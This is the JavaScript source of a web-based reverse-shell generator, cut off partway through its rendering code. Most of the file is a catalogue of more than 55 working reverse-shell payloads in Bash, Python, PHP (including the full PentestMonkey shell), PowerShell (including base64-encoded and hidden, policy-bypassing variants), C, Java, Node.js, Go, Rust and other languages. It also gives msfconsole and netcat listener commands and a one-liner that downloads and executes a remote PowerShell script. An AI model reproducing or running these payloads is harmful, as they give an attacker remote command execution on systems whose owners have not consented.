// ═══════════════════════════════════════════════════════
//  RevShell Generator — Core Logic v5
//  55+ Shells, Multiple Listener Types, Search & Scroll
// ═══════════════════════════════════════════════════════

(() => {
    'use strict';

    // ══════════════════════════════════════════
    //  LISTENER TYPE DEFINITIONS
    // ══════════════════════════════════════════

    const LISTENER_TYPES = [
        {
            id: 'nc',
            name: 'nc',
            needsIp: false,
            generate: (ip, port) => `nc -lvnp ${port}`,
        },
        {
            id: 'ncat',
            name: 'ncat',
            needsIp: false,
            generate: (ip, port) => `ncat -lvnp ${port}`,
        },
        {
            id: 'ncat-ssl',
            name: 'ncat (SSL)',
            needsIp: true, // we might bind to IP
            generate: (ip, port) => ip !== '0.0.0.0' ? `ncat --ssl -s ${ip} -lvnp ${port}` : `ncat --ssl -lvnp ${port}`,
        },
        {
            id: 'rlwrap-nc',
            name: 'rlwrap nc',
            needsIp: false,
            generate: (ip, port) => `rlwrap nc -lvnp ${port}`,
        },
        {
            id: 'nc-udp',
            name: 'nc (UDP)',
            needsIp: false,
            generate: (ip, port) => `nc -lvnpu ${port}`,
        },
        {
            id: 'socat',
            name: 'socat',
            needsIp: false,
            generate: (ip, port) => `socat file:\`tty\`,raw,echo=0 TCP-L:${port}`,
        },
        {
            id: 'socat-ssl',
            name: 'socat (SSL)',
            needsIp: false,
            generate: (ip, port) => `socat OPENSSL-LISTEN:${port},cert=cert.pem,key=key.pem,verify=0,fork STDOUT`,
        },
        {
            id: 'pwncat',
            name: 'pwncat',
            needsIp: true,
            generate: (ip, port) => ip !== '0.0.0.0' ? `pwncat-cs -l ${ip}:${port}` : `pwncat-cs -lp ${port}`,
        },
        {
            id: 'msfconsole',
            name: 'msfconsole',
            needsIp: true,
            generate: (ip, port) => `msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; run"`,
        },
        {
            id: 'msfconsole-staged',
            name: 'msf staged',
            needsIp: true,
            generate: (ip, port) => `msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ${ip}; set LPORT ${port}; run"`,
        },
        {
            id: 'powershell',
            name: 'PowerShell',
            needsIp: false,
            generate: (ip, port) => `$listener = [System.Net.Sockets.TcpListener]${port}; $listener.Start(); Write-Host "Listening on port ${port}..."; $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535|%{0}; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i); Write-Host $data -NoNewline }; $client.Close(); $listener.Stop()`,
        },
        {
            id: 'openssl',
            name: 'openssl',
            needsIp: false,
            generate: (ip, port) => `openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}`,
        },
        {
            id: 'rustcat',
            name: 'rustcat',
            needsIp: true,
            generate: (ip, port) => ip !== '0.0.0.0' ? `rcat listen -p ${port} -l ${ip}` : `rcat listen -p ${port}`,
        },
        {
            id: 'stty',
            name: 'stty + nc',
            needsIp: false,
            generate: (ip, port) => `stty raw -echo; (stty size; cat) | nc -lvnp ${port}`,
        },
        {
            id: 'xterm',
            name: 'Xnest',
            needsIp: false,
            generate: (ip, port) => `Xnest :1    # Then authorize: xhost +targetip`,
        },
    ];

    // Map shell listener hints to recommended listener type
    const LISTENER_RECOMMENDATIONS = {
        'netcat': 'nc',
        'netcat-udp': 'nc-udp',
        'ncat-ssl': 'ncat-ssl',
        'socat': 'socat',
        'xterm': 'xterm',
        'stty': 'stty',
        'openssl': 'openssl',
    };

    // ══════════════════════════════════════════
    //  SHELL DEFINITIONS (55+)
    // ══════════════════════════════════════════

    const SHELLS = [
        // ── BASH ──
        { id: 'bash-i', name: 'Bash -i', icon: '🐚', category: 'Bash', generate: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`, listener: 'netcat' },
        { id: 'bash-196', name: 'Bash 196', icon: '🐚', category: 'Bash', generate: (ip, port) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`, listener: 'netcat' },
        { id: 'bash-readline', name: 'Bash readline', icon: '🐚', category: 'Bash', generate: (ip, port) => `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`, listener: 'netcat' },
        { id: 'bash-5', name: 'Bash 5', icon: '🐚', category: 'Bash', generate: (ip, port) => `bash -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`, listener: 'netcat' },
        { id: 'bash-udp', name: 'Bash UDP', icon: '🐚', category: 'Bash', generate: (ip, port) => `sh -i >& /dev/udp/${ip}/${port} 0>&1`, listener: 'netcat-udp' },

        // ── PYTHON ──
        { id: 'python3-1', name: 'Python3 #1', icon: '🐍', category: 'Python', generate: (ip, port) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`, listener: 'netcat' },
        { id: 'python3-2', name: 'Python3 #2', icon: '🐍', category: 'Python', generate: (ip, port) => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`, listener: 'netcat' },
        { id: 'python3-short', name: 'Python3 shortest', icon: '🐍', category: 'Python', generate: (ip, port) => `python3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("${ip}",${port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("sh")'`, listener: 'netcat' },
        { id: 'python2', name: 'Python2', icon: '🐍', category: 'Python', generate: (ip, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`, listener: 'netcat' },
        { id: 'python3-windows', name: 'Python3 Windows', icon: '🐍', category: 'Python', generate: (ip, port) => `python3 -c "import os,socket,subprocess,threading;s=socket.socket();s.connect(('${ip}',${port}));[threading.Thread(target=lambda fd=f:os.dup2(s.fileno(),fd)).start() for f in(0,1,2)];subprocess.call(['cmd.exe'])"`, listener: 'netcat' },
        { id: 'python-subprocess', name: 'Python subprocess', icon: '🐍', category: 'Python', generate: (ip, port) => `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${ip}",${port}));subprocess.call(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s)'`, listener: 'netcat' },

        // ── PHP ──
        { id: 'php-exec', name: 'PHP exec', icon: '🐘', category: 'PHP', generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("sh <&3 >&3 2>&3");'`, listener: 'netcat' },
        { id: 'php-shell-exec', name: 'PHP shell_exec', icon: '🐘', category: 'PHP', generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});shell_exec("sh <&3 >&3 2>&3");'`, listener: 'netcat' },
        { id: 'php-system', name: 'PHP system', icon: '🐘', category: 'PHP', generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});system("sh <&3 >&3 2>&3");'`, listener: 'netcat' },
        { id: 'php-passthru', name: 'PHP passthru', icon: '🐘', category: 'PHP', generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});passthru("sh <&3 >&3 2>&3");'`, listener: 'netcat' },
        { id: 'php-popen', name: 'PHP popen', icon: '🐘', category: 'PHP', generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});popen("sh <&3 >&3 2>&3", "r");'`, listener: 'netcat' },
        { id: 'php-proc-open', name: 'PHP proc_open', icon: '🐘', category: 'PHP', generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`, listener: 'netcat' },
        {
            id: 'php-pentestmonkey', name: 'PHP PentestMonkey', icon: '🐘', category: 'PHP', generate: (ip, port) => `<?php
        
set_time_limit (0);
$VERSION = "1.0";
$ip = '${ip}';
$port = ${port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>`, listener: 'netcat'
        },
        {
            id: 'php-ivan-sincek', name: 'PHP Ivan Sincek', icon: '🐘', category: 'PHP', listener: 'netcat',
            generate: (ip, port) =>
                `<?php
$ip = '${ip}'; $port = ${port};
$shell = '/bin/sh -i'; $chunk_size = 1400;
$write_a = null; $error_a = null;
$socket = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) { exit(1); }
$descriptorspec = array(0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w"));
$process = @proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }
stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0); stream_set_blocking($socket, 0);
while (1) {
  if (feof($socket) || feof($pipes[1])) break;
  $read_a = array($socket, $pipes[1], $pipes[2]);
  $num = @stream_select($read_a, $write_a, $error_a, null);
  if (in_array($socket, $read_a)) { $input = fread($socket, $chunk_size); fwrite($pipes[0], $input); }
  if (in_array($pipes[1], $read_a)) { $input = fread($pipes[1], $chunk_size); fwrite($socket, $input); }
  if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $chunk_size); fwrite($socket, $input); }
}
fclose($socket); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process);
?>`,
        },
        { id: 'php-cmd', name: 'PHP cmd', icon: '🐘', category: 'PHP', generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("cmd.exe", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`, listener: 'netcat' },
        {
            id: 'php-get', name: 'PHP GET', icon: '🐘', category: 'PHP', listener: 'netcat',
            generate: (ip, port) => `<?php if(isset($_GET['cmd'])){$sock=fsockopen("${ip}",${port});while($s=fgets($sock)){$output=shell_exec($s);fputs($sock,$output);}fclose($sock);} ?>\n\n// Usage: http://target.com/shell.php?cmd=id`,
        },
        { id: 'php-passthru-web', name: 'PHP passthru web', icon: '🐘', category: 'PHP', generate: (ip, port) => `<?php passthru("bash -i >& /dev/tcp/${ip}/${port} 0>&1"); ?>`, listener: 'netcat' },

        // ── RUBY ──
        { id: 'ruby', name: 'Ruby #1', icon: '💎', category: 'Ruby', generate: (ip, port) => `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("${ip}",${port}))'`, listener: 'netcat' },
        { id: 'ruby-2', name: 'Ruby #2', icon: '💎', category: 'Ruby', generate: (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, listener: 'netcat' },
        { id: 'ruby-nosh', name: 'Ruby no sh', icon: '💎', category: 'Ruby', generate: (ip, port) => `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");(IO.popen($_,"r"){|io|c.print io.read})}'`, listener: 'netcat' },

        // ── PERL ──
        { id: 'perl', name: 'Perl', icon: '🐪', category: 'Perl', generate: (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`, listener: 'netcat' },
        { id: 'perl-nosh', name: 'Perl no sh', icon: '🐪', category: 'Perl', generate: (ip, port) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`, listener: 'netcat' },
        { id: 'perl-pentestmonkey', name: 'Perl PentestMonkey', icon: '🐪', category: 'Perl', generate: (ip, port) => `perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'`, listener: 'netcat' },

        // ── NETCAT ──
        { id: 'nc-mkfifo', name: 'nc mkfifo', icon: '🔌', category: 'Netcat', generate: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f`, listener: 'netcat' },
        { id: 'nc-e', name: 'nc -e', icon: '🔌', category: 'Netcat', generate: (ip, port) => `nc ${ip} ${port} -e sh`, listener: 'netcat' },
        { id: 'nc-c', name: 'nc -c', icon: '🔌', category: 'Netcat', generate: (ip, port) => `nc -c sh ${ip} ${port}`, listener: 'netcat' },
        { id: 'nc-pipe', name: 'nc pipe', icon: '🔌', category: 'Netcat', generate: (ip, port) => `rm -f /tmp/p; mknod /tmp/p p && nc ${ip} ${port} 0</tmp/p | /bin/sh 1>/tmp/p`, listener: 'netcat' },
        { id: 'ncat-ssl', name: 'ncat (SSL)', icon: '🔒', category: 'Netcat', generate: (ip, port) => `ncat --ssl ${ip} ${port} -e sh`, listener: 'ncat-ssl' },
        { id: 'ncat-udp', name: 'ncat (UDP)', icon: '🔌', category: 'Netcat', generate: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u ${ip} ${port} >/tmp/f`, listener: 'netcat-udp' },
        { id: 'busybox-nc', name: 'Busybox nc', icon: '🔌', category: 'Netcat', generate: (ip, port) => `busybox nc ${ip} ${port} -e sh`, listener: 'netcat' },

        // ── POWERSHELL ──
        { id: 'powershell-1', name: 'PowerShell #1', icon: '⚡', category: 'PowerShell', generate: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$client.Close()"`, listener: 'netcat' },
        { id: 'powershell-2', name: 'PowerShell #2', icon: '⚡', category: 'PowerShell', generate: (ip, port) => `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`, listener: 'netcat' },
        {
            id: 'powershell-3', name: 'PowerShell #3 (Base64)', icon: '⚡', category: 'PowerShell', listener: 'netcat',
            generate: (ip, port) => {
                const inner = `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                return `powershell -e ${btoa(inner)}`;
            },
        },
        { id: 'powershell-conpty', name: 'PowerShell ConPty', icon: '⚡', category: 'PowerShell', generate: (ip, port) => `IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${ip} ${port}`, listener: 'stty' },

        // ── C ──
        {
            id: 'c-linux', name: 'C (Linux)', icon: '⚙️', category: 'C', listener: 'netcat',
            generate: (ip, port) =>
                `#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = ${port};
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("${ip}");
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2);
    char * const argv[] = {"sh", NULL};
    execve("sh", argv, NULL);
    return 0;
}`,
        },
        {
            id: 'c-windows', name: 'C (Windows)', icon: '⚙️', category: 'C', listener: 'netcat',
            generate: (ip, port) =>
                `#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")
WSADATA wsaData; SOCKET wSock; struct sockaddr_in hax;
STARTUPINFO sui; PROCESS_INFORMATION pi;
int main(int argc, char* argv[]){
    WSAStartup(MAKEWORD(2,2), &wsaData);
    wSock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    hax.sin_family = AF_INET;
    hax.sin_port = htons(${port});
    hax.sin_addr.s_addr = inet_addr("${ip}");
    WSAConnect(wSock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
    memset(&sui,0,sizeof(sui)); sui.cb=sizeof(sui);
    sui.dwFlags=STARTF_USESTDHANDLES;
    sui.hStdInput=sui.hStdOutput=sui.hStdError=(HANDLE)wSock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&sui,&pi);
    return 0;
}`,
        },

        // ── JAVA ──
        { id: 'java-runtime', name: 'Java Runtime', icon: '☕', category: 'Java', generate: (ip, port) => `Runtime r = Runtime.getRuntime();String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/${ip}/${port} 0>&1"};Process p = r.exec(cmd);p.waitFor();`, listener: 'netcat' },
        {
            id: 'java-processbuilder', name: 'Java ProcessBuilder', icon: '☕', category: 'Java', listener: 'netcat',
            generate: (ip, port) =>
                `import java.io.*; import java.net.*;
public class RevShell {
    public static void main(String[] args) throws Exception {
        Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
        Socket s = new Socket("${ip}", ${port});
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}
        p.destroy();s.close();
    }
}`,
        },

        // ── NODE.JS ──
        { id: 'nodejs-1', name: 'Node.js #1', icon: '🟢', category: 'Node.js', generate: (ip, port) => `require('child_process').exec('nc -e sh ${ip} ${port}')`, listener: 'netcat' },
        { id: 'nodejs-2', name: 'Node.js #2', icon: '🟢', category: 'Node.js', generate: (ip, port) => `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("sh",[]);var client=new net.Socket();client.connect(${port},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`, listener: 'netcat' },
        { id: 'nodejs-3', name: 'Node.js #3', icon: '🟢', category: 'Node.js', generate: (ip, port) => `var sh=require('child_process').spawn('/bin/sh',[]);var net=require('net');var client=new net.Socket();client.connect(${port},'${ip}',function(){client.write("Connected!");client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});`, listener: 'netcat' },

        // ── SOCAT ──
        { id: 'socat', name: 'Socat #1', icon: '🔗', category: 'Socat', generate: (ip, port) => `socat TCP:${ip}:${port} EXEC:sh,pty,stderr,setsid,sigint,sane`, listener: 'socat' },
        { id: 'socat-tty', name: 'Socat TTY', icon: '🔗', category: 'Socat', generate: (ip, port) => `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`, listener: 'socat' },

        // ── LUA ──
        { id: 'lua-1', name: 'Lua #1', icon: '🌙', category: 'Lua', generate: (ip, port) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('sh -i <&3 >&3 2>&3');"`, listener: 'netcat' },
        { id: 'lua-2', name: 'Lua #2', icon: '🌙', category: 'Lua', generate: (ip, port) => `lua5.1 -e 'local host,port="${ip}",${port} local socket=require("socket") local tcp=socket.tcp() local io=require("io") tcp:connect(host,port);while true do local cmd,status,partial=tcp:receive() local f=io.popen(cmd,"r") local s=f:read("*a") f:close() tcp:send(s) if status=="closed" then break end end tcp:close()'`, listener: 'netcat' },

        // ── GO ──
        { id: 'golang', name: 'Go (Golang)', icon: '🔵', category: 'Go', generate: (ip, port) => `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`, listener: 'netcat' },

        // ── RUST ──
        {
            id: 'rust', name: 'Rust', icon: '🦀', category: 'Rust', listener: 'netcat',
            generate: (ip, port) =>
                `use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
fn main() {
    let s = TcpStream::connect("${ip}:${port}").unwrap();
    let fd = s.as_raw_fd();
    Command::new("sh").arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn().unwrap().wait().unwrap();
}`,
        },

        // ── OTHERS ──
        { id: 'awk', name: 'awk', icon: '🔧', category: 'Others', generate: (ip, port) => `awk 'BEGIN {s="/inet/tcp/0/${ip}/${port}";while(42){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c);}}while(c!="exit")close(s);}}' /dev/null`, listener: 'netcat' },
        { id: 'groovy', name: 'Groovy', icon: '⭐', category: 'Others', generate: (ip, port) => `String host="${ip}";int port=${port};String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();`, listener: 'netcat' },
        { id: 'telnet', name: 'Telnet', icon: '📡', category: 'Others', generate: (ip, port) => `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | sh 1>$TF`, listener: 'netcat' },
        { id: 'xterm', name: 'xterm', icon: '🖥️', category: 'Others', generate: (ip, port) => `xterm -display ${ip}:1`, listener: 'xterm' },
        {
            id: 'dart', name: 'Dart', icon: '🎯', category: 'Others', listener: 'netcat',
            generate: (ip, port) => `import 'dart:io'; import 'dart:convert';\nmain(){Socket.connect("${ip}",${port}).then((socket){socket.listen((data){Process.start('sh',[]).then((Process process){process.stdin.writeln(new String.fromCharCodes(data).trim());process.stdout.transform(utf8.decoder).listen((output){socket.write(output);});});},onDone:(){socket.destroy();});});}`,
        },
        { id: 'openssl', name: 'OpenSSL', icon: '🔐', category: 'Others', generate: (ip, port) => `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s`, listener: 'openssl' },
        {
            id: 'crystal', name: 'Crystal', icon: '💠', category: 'Others', listener: 'netcat',
            generate: (ip, port) => `require "process"\nrequire "socket"\nc = Socket.tcp(Socket::Family::INET)\nc.connect("${ip}", ${port})\nloop do\n  m, _ = c.receive\n  p = Process.new(m.rstrip("\\n"), output: Process::Redirect::Pipe, shell: true)\n  c << p.output.gets_to_end\nend`,
        },
        { id: 'haskell', name: 'Haskell', icon: 'λ', category: 'Others', generate: (ip, port) => `module Main where\nimport System.Process (callCommand)\nmain = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f"`, listener: 'netcat' },
    ];

    // ── Derive categories ──
    const CATEGORIES = ['All', ...Array.from(new Set(SHELLS.map(s => s.category)))];

    // ── State ──
    let activeShell = null;
    let activeCategory = 'All';
    let searchQuery = '';
    let activeListenerType = 'nc'; // default
    let listenerPortManuallyEdited = false;

    // ── DOM ──
    const $ = (sel) => document.getElementById(sel);
    const $ip = $('ipAddress');
    const $port = $('portNumber');
    const $shellSearch = $('shellSearch');
    const $searchClear = $('searchClear');
    const $categoryTabs = $('categoryTabs');
    const $catScrollLeft = $('catScrollLeft');
    const $catScrollRight = $('catScrollRight');
    const $shellList = $('shellList');
    const $shellCount = $('shellCount');
    const $noResults = $('noResults');
    const $shellCode = $('shellCode');
    const $listenerCode = $('listenerCode');
    const $listenerTypes = $('listenerTypes');
    const $listenerScrollLeft = $('listenerScrollLeft');
    const $listenerScrollRight = $('listenerScrollRight');
    const $copyShell = $('copyShell');
    const $copyListener = $('copyListener');
    const $urlEncode = $('urlEncode');
    const $base64Encode = $('base64Encode');
    const $doubleQuotes = $('doubleQuotes');
    const $activeShellName = $('activeShellName');
    const $disclaimerClose = $('disclaimerClose');
    const $disclaimerBanner = $('disclaimerBanner');
    const $listenerIpGroup = $('listenerIpGroup');
    const $listenerIp = $('listenerIp');
    const $listenerPort = $('listenerPort');

    // ══════════════════════════════════════════
    //  SCROLL ARROWS
    // ══════════════════════════════════════════

    const SCROLL_AMOUNT = 200;

    if ($catScrollLeft) $catScrollLeft.addEventListener('click', () => { $categoryTabs.scrollBy({ left: -SCROLL_AMOUNT, behavior: 'smooth' }); });
    if ($catScrollRight) $catScrollRight.addEventListener('click', () => { $categoryTabs.scrollBy({ left: SCROLL_AMOUNT, behavior: 'smooth' }); });

    if ($listenerScrollLeft) $listenerScrollLeft.addEventListener('click', () => { $listenerTypes.scrollBy({ left: -SCROLL_AMOUNT, behavior: 'smooth' }); });
    if ($listenerScrollRight) $listenerScrollRight.addEventListener('click', () => { $listenerTypes.scrollBy({ left: SCROLL_AMOUNT, behavior: 'smooth' }); });

    // ══════════════════════════════════════════
    //  RENDER
    // ══════════════════════════════════════════

    function renderCategoryTabs() {
        $categoryTabs.innerHTML = '';
        CATEGORIES.forEach(cat => {
            const btn = document.createElement('button');
            btn.className = `cat-tab${cat === activeCategory ? ' active' : ''}`;
            const count = cat === 'All' ? SHELLS.length : SHELLS.filter(s => s.category === cat).length;
            btn.innerHTML = `${cat}<span class="cat-count">(${count})</span>`;
            btn.addEventListener('click', () => {
                activeCategory = cat;
                renderCategoryTabs();
                renderShellList();
            });
            $categoryTabs.appendChild(btn);
        });
    }

    function renderListenerTypes() {
        $listenerTypes.innerHTML = '';

        // Determine recommended listener type from active shell
        let recommendedId = 'nc';
        if (activeShell) {
            const shell = SHELLS.find(s => s.id === activeShell);
